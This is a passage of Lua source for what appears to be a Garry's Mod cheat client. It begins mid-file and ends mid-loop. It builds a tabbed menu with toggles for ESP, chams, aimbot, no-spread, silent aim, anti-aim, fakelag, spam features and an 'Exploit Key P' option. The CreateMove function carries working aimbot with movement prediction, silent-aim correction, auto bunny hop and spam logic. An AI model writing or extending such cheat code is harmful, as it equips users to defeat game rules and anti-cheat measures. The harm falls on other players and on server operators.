    P1Bn:SetText("VISUAL")
    P1Bn:SetFont("DermaLarge")
    P1Bn:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
    function P1Bn:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    function P1Bn:DoClick()
        PSSHEET:SetActiveTab( PSSHEET:GetItems()[1].Tab )
    end

    local P2Bn = st.vgui_Create("DButton", PS)
    P2Bn:SetSize(st.sw() / 5.49,125)
    P2Bn:SetPos(529,0)
    P2Bn:SetText("MISC")
    P2Bn:SetFont("DermaLarge")
    P2Bn:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
    function P2Bn:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    function P2Bn:DoClick()
        PSSHEET:SetActiveTab( PSSHEET:GetItems()[2].Tab )
    end

    local P3Bn = st.vgui_Create("DButton", PS)
    P3Bn:SetSize(st.sw() / 5.49,125)
    P3Bn:SetPos(876,0)
    P3Bn:SetText("MENU")
    P3Bn:SetFont("DermaLarge")
    P3Bn:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
    function P3Bn:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    function P3Bn:DoClick()
        PSSHEET:SetActiveTab( PSSHEET:GetItems()[3].Tab )
    end

    local P4Bn = st.vgui_Create("DButton", PS)
    P4Bn:SetSize(st.sw() / 5.49,125)
    P4Bn:SetPos(1223,0)
    P4Bn:SetText("LUA")
    P4Bn:SetFont("DermaLarge")
    P4Bn:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
    function P4Bn:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    function P4Bn:DoClick()
        PSSHEET:SetActiveTab( PSSHEET:GetItems()[4].Tab )
    end

    local P5Bn = st.vgui_Create("DButton", PS)
    P5Bn:SetSize(st.sw() / 5.49,125)
    P5Bn:SetPos(1570,0)
    P5Bn:SetText("SETTINGS")
    P5Bn:SetFont("DermaLarge")
    P5Bn:SetTextColor(st.string_ToColor(mdrconf.col["white"]))
    function P5Bn:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    function P5Bn:DoClick()
        PSSHEET:SetActiveTab( PSSHEET:GetItems()[5].Tab )
    end

    //checkbox and shit
    local check1 = st.vgui_Create("DPanel", Panel1)
    check1:SetSize(200 ,250)
    check1:SetPos(10 , 10)
    check1.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Chams|",5,5,check1)
    CreatecheckBox("|Chams Ply|",10,30,"PS_chamsply",check1)
    CreatecheckBox("|Chams Prop|",10,60,"PS_chamsprop",check1)
    CreatecheckBox("|Chams Self|",10,90,"PS_selfchams",check1)

    local imbutchams =  st.vgui_Create( "DImageButton", check1)
    imbutchams:SetPos( 175, 5 )				
    imbutchams:SetImage( "icon16/cog.png" )
    imbutchams:SetSize( 20, 20 )
    function imbutchams:DoClick()
        chamscolframe()
    end
    local dmm = st.vgui_Create( "DModelPanel", check1 )
    dmm:SetPos(20,65)
    dmm:SetSize( 80, 200 )
    dmm:SetModel( "models/Humans/Group03/male_07.mdl" )
    dmm:SetAnimSpeed( 500*2 )
	dmm:SetAnimated(true)
    dmm:SetFOV(45)
    function dmm:LayoutEntity(ent)
        self:RunAnimation()
        ent:SetAngles(Angle(0, RealTime() * 50 % 360, 0))
    end
    function dmm:DrawModel()
        local obbmx, obbmn = dmm.Entity:GetModelBounds()
        local vang = dmm.Entity:GetAngles()
        if mdrconf.vars["PS_boxply"] then
            st.render_DrawWireframeBox(dmm.Entity:GetPos() + Vector(0, 0, 0),vang,obbmx - Vector(2, 2, 1.5), obbmn + Vector(2, 2, 1.5), st.string_ToColor(mdrconf.col["boxplycolor1"]))
            st.render_DrawWireframeBox(dmm.Entity:GetPos() + Vector(0, 0, 0),vang,obbmx - Vector(1.5, 1.5, 0), obbmn + Vector(1.5, 1.5, 0), st.string_ToColor(mdrconf.col["boxplycolor1"]))
            st.render_DrawWireframeBox(dmm.Entity:GetPos() + Vector(0, 0, 0),vang,obbmx - Vector(2, 2, 1),  obbmn + Vector(2, 2, 1), st.string_ToColor(mdrconf.col["boxplycolor1"]))
        end
        dmm.Entity:DrawModel()
        local colppp1 = st.string_ToColor(mdrconf.col["chamscolply1"])
        local colppp2 = st.string_ToColor(mdrconf.col["chamscolply2"])
        if mdrconf.vars["PS_chamsply"] then
            st.render_SuppressEngineLighting(true)
            st.render_SetColorModulation( colppp2.r /255, colppp2.g /255, colppp2.b /255)
            st.render_MaterialOverride(st.textured_z)
            dmm.Entity:DrawModel()
            st.render_SetColorModulation( colppp1.r /255, colppp1.g /255, colppp1.b /255)
            st.render_MaterialOverride(st.textured)
            dmm.Entity:DrawModel()
            st.render_MaterialOverride(nil)
            st.render_SetColorModulation(1, 1, 1) 
            st.render_SuppressEngineLighting(false) 
        end
    end

    local dmm2 = st.vgui_Create( "DModelPanel", check1)
    dmm2:SetPos(115,45)
    dmm2:SetSize( 50, 200 )
    dmm2:SetModel( "models/props_borealis/borealis_door001a.mdl" )
    dmm2:SetAnimSpeed( 500*2 )
	dmm2:SetAnimated(true)
    dmm2:SetFOV(45)
    function dmm2:LayoutEntity(ent)
        self:RunAnimation()
        ent:SetAngles(Angle(0, RealTime() * 50 % 360, 0))
    end
    function dmm2:DrawModel()
        local obbmx, obbmn = dmm2.Entity:GetModelBounds()
        local vang = dmm2.Entity:GetAngles()
        if mdrconf.vars["PS_boxprop"] then
            st.render_DrawWireframeBox(dmm2.Entity:GetPos() + Vector(0, 0, 0),vang,obbmx - Vector(2.5, 2.5, 1.5), obbmn + Vector(2.5, 2.5, 1.5), st.string_ToColor(mdrconf.col["boxpropcolor1"]))
            st.render_DrawWireframeBox(dmm2.Entity:GetPos() + Vector(0, 0, 0),vang,obbmx - Vector(1.5, 1.5, 0), obbmn + Vector(1.5, 1.5, 0), st.string_ToColor(mdrconf.col["boxpropcolor1"]))
            st.render_DrawWireframeBox(dmm2.Entity:GetPos() + Vector(0, 0, 0),vang,obbmx - Vector(2, 2, 1),  obbmn + Vector(2, 2, 1), st.string_ToColor(mdrconf.col["boxpropcolor1"]))
        end
        dmm2.Entity:DrawModel()
        local colpppp1 = st.string_ToColor(mdrconf.col["chamscolprop1"])
        local colpppp2 = st.string_ToColor(mdrconf.col["chamscolprop2"])
        if mdrconf.vars["PS_chamsprop"] then
            st.render_SuppressEngineLighting(true)
            st.render_SetColorModulation( colpppp2.r /255, colpppp2.g /255, colpppp2.b /255)
            st.render_MaterialOverride(st.textured_z)
            dmm2.Entity:DrawModel()
            st.render_SetColorModulation( colpppp1.r /255, colpppp1.g /255, colpppp1.b /255)
            st.render_MaterialOverride(st.textured)
            dmm2.Entity:DrawModel()
            st.render_MaterialOverride(nil)
            st.render_SetColorModulation(1, 1, 1) 
            st.render_SuppressEngineLighting(false) 
        end
    end

    local check2 = st.vgui_Create("DPanel", Panel1)
    check2:SetSize(200 ,250)
    check2:SetPos(220 , 10)
    check2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Box|",5,5,check2)
    CreatecheckBox("|Box Ply|",10,30,"PS_boxply",check2)
    CreatecheckBox("|Box Prop|",10,60,"PS_boxprop",check2)
    CreatecheckBox("|Hitbox|",10,90,"PS_hitbox",check2)
    CreatecheckBox("|FallBox|",10,120,"PS_fallbox",check2)
    CreatecheckBox("|Self Box|",10,150,"PS_selfbox",check2)
    CreatecheckBox("|Self Hitbox|",10,180,"PS_selfhitbox",check2)

    local imbutbox =  st.vgui_Create( "DImageButton", check2)
    imbutbox:SetPos( 175, 5 )				
    imbutbox:SetImage( "icon16/cog.png" )
    imbutbox:SetSize( 20, 20 )
    function imbutbox:DoClick()
        boxcolframe()
    end

    local check3 = st.vgui_Create("DPanel", Panel1)
    check3:SetSize(200 ,250)
    check3:SetPos(430 , 10)
    check3.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Other|",5,5,check3)
    CreatecheckBox("|Skeleton|",10,30,"PS_skeleton",check3)
    CreatecheckBox("|Skeleton Self|",10,60,"PS_selfskeleton",check3)

    local imbutother =  st.vgui_Create( "DImageButton", check3)
    imbutother:SetPos( 175, 5 )				
    imbutother:SetImage( "icon16/cog.png" )
    imbutother:SetSize( 20, 20 )
    function imbutother:DoClick()
        othercolframe()
    end

    local check4 = st.vgui_Create("DPanel", Panel1)
    check4:SetSize(200 ,250)
    check4:SetPos(640 , 10)
    check4.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end

    local check5 = st.vgui_Create("DPanel", Panel1)
    check5:SetSize(200 ,250)
    check5:SetPos(10 , 270)
    check5.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Esp Text|",5,5,check5)
    CreatecheckBox("|Esp Name|",10,30,"PS_espname",check5)
    CreatecheckBox("|Esp UsrGrp|",10,60,"PS_espusergrp",check5)
    CreatecheckBox("|Esp Health|",10,90,"PS_esphealth",check5)
    CreatecheckBox("|Esp Armor|",10,120,"PS_esparmor",check5)
    CreatecheckBox("|Esp Weapon|",10,150,"PS_weapon",check5)
    CreatecheckBox("|Esp Money|",10,180,"PS_moneyesp",check5)
    CreatecheckBox("|Esp Friend|",10,210,"PS_friendesp",check5)

    local imbutesp =  st.vgui_Create( "DImageButton", check5)
    imbutesp:SetPos( 175, 5 )				
    imbutesp:SetImage( "icon16/cog.png" )
    imbutesp:SetSize( 20, 20 )
    function imbutesp:DoClick()
        espcolframe()
    end

    local check6 = st.vgui_Create("DPanel", Panel1)
    check6:SetSize(200 ,250)
    check6:SetPos(220 , 270)
    check6.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end

    local check7 = st.vgui_Create("DPanel", Panel1)
    check7:SetSize(200 ,250)
    check7:SetPos(430 , 270)
    check7.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end

    local check8 = st.vgui_Create("DPanel", Panel1)
    check8:SetSize(200 ,250)
    check8:SetPos(640 , 270)
    check8.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end

    local check6p2 = st.vgui_Create("DPanel", Panel2)
    check6p2:SetSize(200 ,250)
    check6p2:SetPos(10 , 10)
    check6p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|WaterMark|",5,5,check6p2)
    CreatecheckBox("|Simple|",10,30,"PS_watermark",check6p2)
    CreatecheckBox("|CrossBow Info|",10,60,"PS_crossbowinfo",check6p2)
    CreatecheckBox("|Timestamp Info|",10,90,"PS_timestamp",check6p2)
    CreatecheckBox("|Velocity|",10,120,"PS_velocity",check6p2)

    local check7p2 = st.vgui_Create("DPanel", Panel2)
    check7p2:SetSize(200 ,250)
    check7p2:SetPos(220 , 10)
    check7p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Minge|",5,5,check7p2)
    CreatecheckBox("|Camera Spam|",10,30,"PS_cameraspam",check7p2)
    CreatecheckBox("|Flash Spam|",10,60,"PS_flashspam",check7p2)
    CreatecheckBox("|Use Spam|",10,90,"PS_usespam",check7p2)
    CreatecheckBox("|Chat Spam|",10,120,"PS_chatspam",check7p2)

    local check8p2 = st.vgui_Create("DPanel", Panel2)
    check8p2:SetSize(200 ,250)
    check8p2:SetPos(430 , 10)
    check8p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Movement|",5,5,check8p2)
    CreatecheckBox("|AutoBunnyHop|",10,30,"PS_autobunnyhop",check8p2)
    CreatecheckBox("|AutoStrafe|",10,60,"PS_autostrafe",check8p2)
    CreateSlider("", 190, 15, 5, 90,"PS_BUNNYCHANCE", 0, 100,check8p2)

    local check9p2 = st.vgui_Create("DPanel", Panel2)
    check9p2:SetSize(200 ,250)
    check9p2:SetPos(640 , 10)
    check9p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Fun|",5,5,check9p2)
    CreatecheckBox("|TrailRain|",10,30,"PS_trailrain",check9p2)
    CreatecheckBox("|FreeCam|",10,60,"PS_freecam",check9p2)
    CreatecheckBox("|PhysLine|",10,90,"PS_physline",check9p2)
    CreatecheckBox("|PhysGunRainBow|",10,120,"PS_physrainbow",check9p2)
    CreatecheckBox("|FastWalk|",10,150,"PS_fastwalk",check9p2)
    CreatecheckBox("|Exploit Key P|",10,180,"PS_vjbase",check9p2)
    CreatecheckBox("|Hitsound|",10,210,"PS_hitsound",check9p2)

    local check99p2 = st.vgui_Create("DPanel", Panel2)
    check99p2:SetSize(200 ,250)
    check99p2:SetPos(640 , 270)
    check99p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Visual Misc|",5,5,check99p2)
    CreatecheckBox("|SkyBox Black|",10,30,"PS_skyboxremove",check99p2)

    local check10p2 = st.vgui_Create("DPanel", Panel2)
    check10p2:SetSize(200 ,250)
    check10p2:SetPos(10 , 270)
    check10p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|Fov And Third|",5,5,check10p2)
    CreatecheckBox("|Field Of View|",10,30,"PS_fov",check10p2)
    CreatecheckBox("|Thirdperson|",10,60,"PS_third",check10p2)
    CreateSlider("", 190, 15, 5, 90,"PS_fovdist", 57, 179,check10p2)
    CreateSlider("", 190, 15, 5, 110,"PS_thirddist", 50, 250,check10p2)

    local check11p2 = st.vgui_Create("DPanel", Panel2)
    check11p2:SetSize(200 ,250)
    check11p2:SetPos(220 , 270)
    check11p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|No Recoil/Spread|",5,5,check11p2)
    CreatecheckBox("|No Recoil|",10,30,"PS_norecoil",check11p2)
    CreatecheckBox("|No Spread|",10,60,"PS_NoSpread",check11p2)

    local check12p2 = st.vgui_Create("DPanel", Panel2)
    check12p2:SetSize(200 ,250)
    check12p2:SetPos(430 , 270)
    check12p2.Paint = function(self, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    CreateLabel("|AA And Shit|",5,5,check12p2)
    CreatecheckBox("|Fakelag|",10,30,"PS_fakelag",check12p2)
    CreatecheckBox("|AimBot|",10,60,"PS_aimbot",check12p2)
     CreateDropdown("",5,60,190,18,"Classic Pred",mdrconf.util["predtype"],"PS_predtype",check12p2)
    CreatecheckBox("|AA In Dev|",10,100,"PS_antiaim",check12p2)
    CreatecheckBox("|Interp|",10,130,"PS_INTERPOLATION",check12p2)
    CreatecheckBox("|Silent|",10,220,"PS_silent",check12p2)

    local aimbotbut =  st.vgui_Create( "DImageButton", check12p2)
    aimbotbut:SetPos( 175, 5 )				
    aimbotbut:SetImage( "icon16/cog.png" )
    aimbotbut:SetSize( 20, 20 )
    function aimbotbut:DoClick()
        aimfakelframe()
    end
    CreateDropdown("",10,-10,150,50,"Backgound",mdrconf.util["backgroun"],"PS_bckgrd",Panel3)
    CreateDropdown("",730,-10,150,50,"Cable/RedLaser",mdrconf.util["physline"],"PS_physlin",Panel5)
    CreateDropdown("",730,40,150,50,"Neverlose",mdrconf.util["Hitsound"],"PS_hit",Panel5)

    CreatecheckBox("|NetLogger|",10,10,"PS_netloger",Panel5)
    CreatecheckBox("|HtppLogger|",10,40,"PS_httploger",Panel5)
    CreatecheckBox("|FileLogger|",10,70,"PS_fileloger",Panel5)

    function PSCreateeMove(cmd)
        Silent(cmd)

        if cmd:CommandNumber() == 0 then return end

        if mdrconf.vars["PS_silent"] then cmd:SetViewAngles(st.fa) end

        if mdrconf.vars["PS_cameraspam"] then
    	    if st.input_IsKeyDown(KEY_U)then
    	    	st.runco("use","gmod_camera")
    	    	if cmd:TickCount()%2==0 then
    	    		cmd:SetButtons(bit.bor(cmd:GetButtons(),IN_ATTACK))
    	    	end
    	    end
        elseif mdrconf.vars["PS_flashspam"] then
            if st.input_IsKeyDown(KEY_U)then
                st.runco("impulse", "100" )
            end
        elseif mdrconf.vars["PS_usespam"] then
            if cmd:KeyDown(IN_USE) then
                if cmd:TickCount()%2 == 0 then
	            	cmd:RemoveKey(IN_USE)
	            else
	            	cmd:AddKey(IN_USE)
	            end
            end
        end

        if mdrconf.vars["PS_autobunnyhop"] then
            local ch = mdrconf.vars["PS_BUNNYCHANCE"] / 100
		    if st.me():GetMoveType() == MOVETYPE_LADDER || st.me():GetMoveType() == MOVETYPE_NOCLIP then return end
		    if cmd:KeyDown( IN_JUMP ) then
                if math.random() <= ch then
		            if !st.me():OnGround() then
		            	cmd:SetButtons( cmd:GetButtons() - IN_JUMP )
		            end
                end
                if mdrconf.vars["PS_autostrafe"] then
                    if st.me():IsFlagSet( FL_ONGROUND ) then
                        cmd:SetForwardMove(10000)
                    else
                        cmd:SetForwardMove(5850 / st.me():GetVelocity():Length2D())
                        cmd:SetSideMove((cmd:CommandNumber() % 2 == 0) && -400 || 400)
                    end
                end
		    end
	    end

        if mdrconf.vars["PS_fastwalk"] then
            if st.me():GetMoveType() == MOVETYPE_WALK and cmd:GetForwardMove() ~= 0 then
	        	if cmd:TickCount()%2 == 0 then
	        		cmd:SetSideMove(cmd:GetSideMove() + 5250)
	        	else
	        		cmd:SetSideMove(cmd:GetSideMove() - 5250)
	        	end
	        end
        end



        local wish_yaw = st.fa.y 

        AntiAim(cmd)
        
        if mdrconf.vars["PS_aimbot"] then
            if cmd:KeyDown(IN_ATTACK) then
                local weap = st.me():GetActiveWeapon()
                local cloply = GetPlayerInCircle()
                local bone = mdrconf.vars["PS_bone"]
                local direction = nil
                if cloply then
                    //aim
                    local GetLatency = (st.me():Ping()/1000)
                    local lvel,tvel,frm,eng = st.me():GetAbsVelocity(), cloply:GetAbsVelocity(), RealFrameTime(), st.engine_TickInterval()
                    local pos = cloply:GetBonePosition(cloply:LookupBone(bone))
                    local bonePos = pos
                    if mdrconf.vars["PS_predtype"] == "Classic Pred" then
                        bonePos = pos-(lvel*eng)
                    elseif mdrconf.vars["PS_predtype"] == "Engine Pred" then
                        bonePos = tvel == 0 and pos or pos+tvel*eng*frm-lvel*eng 
                    elseif mdrconf.vars["PS_predtype"] == "Velocity Pred" then
                        bonePos = pos+((lvel-tvel)*(frm/(1/eng)))
                    end
                    direction = (bonePos - st.me():GetShootPos()):Angle()
                    if mdrconf.vars["PS_NoSpread"] then
                        if !st.goodsweps[weap:GetClass()] then
                            direction = predictSpread(cmd, direction)
                        end
                    end
                    /*//aim crossbow pred
                    local bolt_speed = 3480
                    local aimpos = cloply:GetNetworkOrigin() + cloply:OBBCenter()
                    local plyspeed = cloply:GetAbsVelocity()

                    local travelspeed = st.me():GetPos():Distance(aimpos) / bolt_speed  
                    local pred = aimpos + (plyspeed * travelspeed)
                    if not cloply:IsOnGround() then
                        local gravity = Vector(0, 0, -GetConVarNumber("sv_gravity"))
                        pred = pred + (0.5 * gravity * (travelspeed ^ 2))
                    end

                    local finalVec = Vector( pred.x, pred.y, pred.z )
                    local crosspred = (finalVec - st.me():GetShootPos()):Angle()
                    debugoverlay.Box(finalVec, cloply:OBBMins(), cloply:OBBMaxs(), 1, Color(255, 255, 255))

                    st.travelspeedinfo = travelspeed
                    st.gravityinfo = gravity
                    st.predinfo = tostring(pred)
                    st.crosspredinfo = tostring(crosspred)*/

                    if mdrconf.vars["PS_hideshot"] then
                        direction.p = direction.p + 178
                        direction.y = direction.y + 180
                    end

                    direction:Normalize()
                    //crosspred:Normalize()
                    if VisibleCheck(cloply, bonePos, predticks) then
                        if IsValid(weap) then
                            if st.goodsweps[weap:GetClass()] then
                                //cmd:SetViewAngles(crosspred) -- crossbow pred
                            else
                                cmd:SetViewAngles(direction)
                            end
                        end
                    end
                end
            end
        end

        if mdrconf.vars["PS_silent"] then
	        FixMovment( cmd, wish_yaw)
        end

        if mdrconf.vars["PS_freecam"] then
            if (st.freecamEnabled) then
                cmd:SetSideMove(0)
                cmd:SetForwardMove(0)
                cmd:SetViewAngles(st.freecamAngles2)
                cmd:RemoveKey(IN_JUMP)
                cmd:RemoveKey(IN_DUCK)
                st.fa = (st.fa + Angle(cmd:GetMouseY() * .023, cmd:GetMouseX() * -.023, 0));
                st.fa.p, st.fa.y, st.fa.x = st.math_Clamp(st.fa.p, -89, 89), st.math_NormalizeAngle(st.fa.y), st.math_NormalizeAngle(st.fa.x);
                local curFreecamSpeed = 5
                if(st.input_IsKeyDown(KEY_LSHIFT)) then
                    curFreecamSpeed = 5 * 4
                end
                if (st.input_IsKeyDown(KEY_Z)) then
                    st.freecamPos = st.freecamPos + (st.fa:Forward() * curFreecamSpeed)
                end
                if (st.input_IsKeyDown(KEY_S)) then
                    st.freecamPos = st.freecamPos - (st.fa:Forward() * curFreecamSpeed)
                end
                if (st.input_IsKeyDown(KEY_Q)) then
                    st.freecamPos = st.freecamPos - (st.fa:Right() * curFreecamSpeed)
                end
                if (st.input_IsKeyDown(KEY_D)) then
                    st.freecamPos = st.freecamPos + (st.fa:Right() * curFreecamSpeed)
                end
                if (st.input_IsKeyDown(KEY_SPACE)) then
                    st.freecamPos = st.freecamPos + Vector(0,0,10)
                end
                if (st.input_IsKeyDown(KEY_C)) then
                    st.freecamPos = st.freecamPos - Vector(0,0,10)
                end
            end
        end

        if st.spec then
            cmd:SetSideMove(0)
            cmd:SetForwardMove(0)
            cmd:SetViewAngles(st.freecamAngles2)
            cmd:RemoveKey(IN_JUMP)
            cmd:RemoveKey(IN_DUCK)
        end

        if !mdrconf.vars["PS_silent"] then st.fa = cmd:GetViewAngles() end
        
    end

    function PSHUDDPaint()

    if gui.IsGameUIVisible() then return end

        if mdrconf.vars["PS_watermark"] then 
            st.draw_DrawText("Welcome Back "..st.me():Nick() .. " On "..mdrconf.util.WatermarkText, "DTFont", 5, 190, st.string_ToColor(mdrconf.col["lc"]) )
            st.draw_DrawText("BLOOD PRESSURE"..st.me():Health(), "DTFont", 5, 205,st.me():Health() < 25 and st.string_ToColor(mdrconf.col["blc"]) or st.string_ToColor(mdrconf.col["lc"]) )
            st.draw_DrawText("SRVSPEED"..st.math_Round( 1/ st.engine_TickInterval()) , "DTFont", 5, 220, st.string_ToColor(mdrconf.col["lc"]) )
            st.draw_DrawText("CARBON%"..st.math_Round( 1 / FrameTime()), "DTFont", 5, 235, st.math_Round( 1 / FrameTime()) < 30 and st.string_ToColor(mdrconf.col["blc"]) or st.string_ToColor(mdrconf.col["lc"]) )
            st.draw_DrawText("CHOLESTEROL%"..st.tC, "DTFont", 5,250, mdrconf.vars["PS_fakelag"] and st.string_ToColor(mdrconf.col["lc"]) or st.string_ToColor(mdrconf.col["blc"]))
            st.draw_DrawText("HYPERSPEED%"..st.math_Round(st.me():GetVelocity():Length2D()), "DTFont", 5,265,st.string_ToColor(mdrconf.col["lc"]))
            st.draw_DrawText("INSULIN", "DTFont", 5,280, mdrconf.vars["PS_BreakLC"] and st.string_ToColor(mdrconf.col["blc"]) or st.string_ToColor(mdrconf.col["lc"]))
            if mdrconf.vars["PS_netloger"] then
                st.draw_DrawText("Netlogger:Active","DTFont", 5,460, st.string_ToColor(mdrconf.col["lc"]))
            else
                st.draw_DrawText("Netlogger:Inactive","DTFont", 5,460, st.string_ToColor(mdrconf.col["lc"]))
            end
            if mdrconf.vars["PS_httploger"] then
                st.draw_DrawText("Httplogger:Active","DTFont", 5,475, st.string_ToColor(mdrconf.col["lc"]))
            else
                st.draw_DrawText("Httplogger:Inactive","DTFont", 5,475, st.string_ToColor(mdrconf.col["lc"]))
            end
            if mdrconf.vars["PS_fileloger"] then
                st.draw_DrawText("Filelogger:Active","DTFont", 5,490, st.string_ToColor(mdrconf.col["lc"]))
            else
                st.draw_DrawText("Filelogger:Inactive","DTFont", 5,490, st.string_ToColor(mdrconf.col["lc"]))
            end
        end

        local weap = st.me():GetActiveWeapon()
        if IsValid(weap) then
            if mdrconf.vars["PS_crossbowinfo"] and st.goodsweps[weap:GetClass()] and mdrconf.vars["PS_aimbot"] then
                st.draw_DrawText("Pred Raw Info:"..st.predinfo, "DTFont", 5,330, st.string_ToColor(mdrconf.col["lc"]))
                st.draw_DrawText("Pred Final Info:"..st.crosspredinfo, "DTFont", 5,345, st.string_ToColor(mdrconf.col["lc"]))
                st.draw_DrawText("Bolt Speed To Victim:"..st.travelspeedinfo, "DTFont", 5,360, st.string_ToColor(mdrconf.col["lc"]))
                st.draw_DrawText("Fall%"..st.gravityinfo, "DTFont", 5,375, st.string_ToColor(mdrconf.col["lc"]))
            end
        end

        if mdrconf.vars["PS_timestamp"] then
            if IsValid(weap) then
                if mdrconf.vars["PS_crossbowinfo"] and st.goodsweps[weap:GetClass()] and mdrconf.vars["PS_aimbot"] then 
                    st.draw_DrawText("Paris:"..os.date("%Y-%m-%d %H:%M:%S", os.time() + 0 * 3600), "DTFont", 5,400, st.string_ToColor(mdrconf.col["lc"]))
                    st.draw_DrawText("Tokyo:"..os.date("%Y-%m-%d %H:%M:%S", os.time() + 7 * 3600), "DTFont", 5,415, st.string_ToColor(mdrconf.col["lc"]))
                    st.draw_DrawText("Moscou:"..os.date("%Y-%m-%d %H:%M:%S", os.time() + 3 * 3600), "DTFont", 5,430, st.string_ToColor(mdrconf.col["lc"]))
                    st.draw_DrawText("Toronto"..os.date("%Y-%m-%d %H:%M:%S", os.time() - 6 * 3600), "DTFont", 5,445, st.string_ToColor(mdrconf.col["lc"]))
                else
                    st.draw_DrawText("Paris:"..os.date("%Y-%m-%d %H:%M:%S", os.time() + 0 * 3600), "DTFont", 5,300, st.string_ToColor(mdrconf.col["lc"]))
                    st.draw_DrawText("Tokyo:"..os.date("%Y-%m-%d %H:%M:%S", os.time() + 7 * 3600), "DTFont", 5,315, st.string_ToColor(mdrconf.col["lc"]))
                    st.draw_DrawText("Moscou:"..os.date("%Y-%m-%d %H:%M:%S", os.time() + 3 * 3600), "DTFont", 5,330, st.string_ToColor(mdrconf.col["lc"]))
                    st.draw_DrawText("Toronto"..os.date("%Y-%m-%d %H:%M:%S", os.time() - 6 * 3600), "DTFont", 5,345, st.string_ToColor(mdrconf.col["lc"]))
                end
            end
        end

        if mdrconf.vars["PS_skeleton"] then
            for k, v in ipairs(st.ply()) do
                if not IsValid(v) or v == st.me() or not v:Alive() or v:IsDormant() then continue end 
		    	for _, b in pairs( st.SkeletonTBL ) do
		    		if v:LookupBone(b.F) != nil && v:LookupBone(b.B) != nil then
